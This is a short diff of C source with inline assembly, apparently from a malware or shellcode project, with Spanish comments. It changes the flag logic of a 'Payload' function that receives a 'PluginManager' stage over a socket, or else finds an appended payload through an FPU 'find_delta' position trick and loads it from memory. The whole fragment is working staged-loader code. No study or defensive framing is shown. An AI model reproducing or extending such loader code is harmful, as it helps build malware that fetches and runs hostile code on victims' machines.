@@ -403,7 +403,7 @@ void FreeLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
 #pragma endregion
 
 void Payload(PSHELLCODE_CONTEXT scc){
-    bool  bReceived = true;
+    bool  bReceived = false;
     char* bBuff     = 0;
     DWORD dwSize    = 0;
     DWORD dwDSize   = 15;
@@ -422,6 +422,7 @@ void Payload(PSHELLCODE_CONTEXT scc){
                 DWORD lResult   = 0;
 
                 //Recibimos el PluginManager
+                bReceived = true;
                 while ((dwASize > 0) && (bReceived==true)){
                     lResult = scc->recv_(scc->hSocket, (char*)(bBuff+(dwSize-dwASize)), dwASize, 0);
                     dwASize -= lResult;
@@ -432,7 +433,6 @@ void Payload(PSHELLCODE_CONTEXT scc){
             }
         }
     }else{
-
         DWORD last_err = ERROR_SUCCESS;
         __asm{
             xor eax, eax                    //EAX = 0
@@ -440,6 +440,7 @@ void Payload(PSHELLCODE_CONTEXT scc){
             mov [last_err], eax             //> last_err = GetLastError()
         }
         if (last_err == WSAENOTCONN){
+            //TO DO: LEER PLUGINMANAGER ADHERIDO
             DWORD delta = 0;
             __asm{
 find_delta:     fldpi
@@ -451,6 +452,7 @@ find_delta:     fldpi
             bBuff = (char*)(delta + ((PBYTE)main - (PBYTE)Start));
             dwDSize = *(DWORD*)(delta + ((PBYTE)main - (PBYTE)Start) - 4);
             dwSize = dwDSize;
+            bReceived = true;
         }else{
             return;
         }
